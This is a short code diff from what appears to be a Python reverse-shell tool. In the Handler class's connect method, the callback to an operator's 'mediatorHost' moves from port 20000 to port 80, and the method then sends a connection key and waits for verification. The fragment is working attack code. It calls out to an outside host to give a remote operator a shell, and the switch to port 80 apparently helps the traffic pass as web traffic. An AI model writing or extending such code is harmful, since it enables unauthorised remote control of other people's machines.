@@ -106,7 +106,7 @@ class Handler:
     def connect(self, mediatorHost):
         # connect to moderator on operator port
         print("Connecting to reverse shell...")
-        self.shell.connect((gethostbyname(mediatorHost), 20000))
+        self.shell.connect((gethostbyname(mediatorHost), 80))
         # send verification
         self.shell.sendall(self.connectionKey.encode())
         verification = self.shell.recv(1024)
